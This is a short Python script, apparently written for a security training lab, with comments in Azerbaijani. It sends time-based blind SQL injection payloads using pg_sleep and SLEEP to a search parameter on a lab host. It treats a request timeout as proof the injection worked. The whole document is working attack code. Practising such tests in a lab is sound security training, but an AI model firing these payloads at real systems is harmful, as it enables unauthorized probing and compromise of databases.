import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/"

# Fərqli payload və funksiyaları yoxlayaq
payloads = [
    "test' AND pg_sleep(6)--",
    "test' OR pg_sleep(6)--",
    "1 AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)"
]

for p in payloads:
    print(f"Yoxlanılır: {p}")
    start = time.time()
    try:
        res = requests.get(url, params={"search": p}, timeout=10)
        elapsed = time.time() - start_time if 'start_time' in locals() else time.time() - start
        print(f"Müddət: {time.time() - start:.2f} saniyə")
    except requests.exceptions.Timeout:
        print("[+] UĞURLU! Timeout baş verdi (Gecikmə işlədi!).")
        break
